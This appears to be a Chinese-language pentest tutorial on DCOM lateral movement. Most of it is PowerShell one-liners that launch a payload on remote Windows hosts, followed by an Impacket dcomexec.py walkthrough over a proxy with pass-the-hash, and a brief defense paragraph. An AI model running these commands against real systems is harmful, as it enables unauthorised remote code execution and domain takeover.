### 使用DCOM在远程Windows系统上执行命令

本文将介绍如何通过DCOM（分布式组件对象模型）在远程Windows系统上执行命令。我们将使用PowerShell脚本和Impacket中的`dcomexec.py`脚本来实现这一目标。

#### 1. 使用PowerShell与DCOM进行远程交互

以下是一些常用的DCOM对象及其使用方法：

##### （1）调用ShellWindows对象
- **适用系统**：Windows 7~Windows 10、Windows Server 2008~Windows Server 2016
- **无需事先建立IPC连接**
- **只需当前主机的管理员权限**

```powershell
# 创建ShellWindows对象的实例
$com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', "192.168.52.138"))

# 在远程主机上启动进程
$com.item().Document.Application.ShellExecute("cmd.exe", "/c C:\shell.exe", "c:\windows\system32", $null, 0)

# 完整命令
[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', "192.168.52.138")).item().Document.Application.ShellExecute("cmd.exe", "/c C:\shell.exe", "c:\windows\system32", $null, 0)
```

##### （2）调用Excel.Application对象
- **适用系统**：Windows 7~Windows 10、Windows Server 2008~Windows Server 2016

```powershell
# 创建Excel.Application对象的实例
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.138"))
$com.DisplayAlerts = $false

# 在远程主机上启动进程
$com.DDEInitiate("cmd.exe", "/c C:\shell.exe")
```

##### （3）调用ShellBrowserWindow对象
- **适用系统**：Windows 10、Windows Server 2012 R2等

```powershell
# 创建ShellBrowserWindow对象的实例
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "192.168.52.138"))

# 在远程主机上启动进程
$com.Document.Application.shellExecute("C:\shell.exe")

# 完整命令
[activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "192.168.52.138")).Document.Application.shellExecute("C:\shell.exe")
```

##### （4）调用Visio.Application对象
- **适用系统**：安装了Visio的目标主机

```powershell
# 创建Visio.Application对象的实例
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application", "192.168.52.138"))

# 在远程主机上启动进程
$com.[0].Document.Application.shellExecute("calc.exe")

# 完整命令
[activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application", "192.168.52.138")).[0].Document.Application.shellExecute("C:\shell.exe")
```

##### （5）调用Outlook.Application对象
- **适用系统**：安装了Outlook的目标主机

```powershell
# 创建Outlook.Application对象的实例
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application", "192.168.52.138"))

# 通过Outlook创建Shell.Application对象并执行命令
$com.createObject("Shell.Application").shellExecute("C:\shell.exe")

# 完整命令
[activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application", "192.168.52.138")).createObject("Shell.Application").shellExecute("C:\shell.exe")
```

#### 2. 使用Impacket中的dcomexec.py脚本

Impacket库中的`dcomexec.py`脚本可以提供一个类似于`wmiexec.py`的半交互式shell，但使用的是DCOM。目前支持的DCOM对象包括`MMC20.Application`、`ShellWindows`和`ShellBrowserWindow`。

##### 命令格式
```bash
./dcomexec.py domain/username:password@ip
```

##### 实验环境
假设攻击者已经获得了域内主机Windows Server 2012的控制权，并获得了域管理员的用户名和密码。以下是使用`dcomexec.py`脚本进一步获取Windows 7 shell的步骤：

1. 在Windows Server 2012上上传代理程序，并在1080端口上搭建一个SOCKS代理服务器。
2. 配置`proxychains`以通过代理访问内网。

```bash
# 获取目标主机的shell
proxychains4 python3 ./dcomexec.py god/administrator:PI:EMAIL

# 在目标主机上执行命令
proxychains4 python3 ./dcomexec.py god/administrator:PI:EMAIL whoami

# 使用哈希值代替明文密码
proxychains4 python3 ./dcomexec.py administrator:@192.168.52.143 whoami -hashes aad3b435b51404eeaad3b435b51404ee:d8f69f9520b448174136e49a1051ef07
```

#### 3. 防御DCOM横向移动

首要的方法是启动域防火墙，因为默认情况下这会阻止DCOM对象的实例化。尽管开启了防火墙，攻击者仍然可以通过某些方法远程篡改或关闭Windows防火墙。因此，我们还需要进一步设置安全策略。详情请参考相关文档。

#### 参考资料
- [https://3gstudent.github.io/3gstudent.github.io/域渗透-> 利用DCOM在远程系统执行程序/](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/)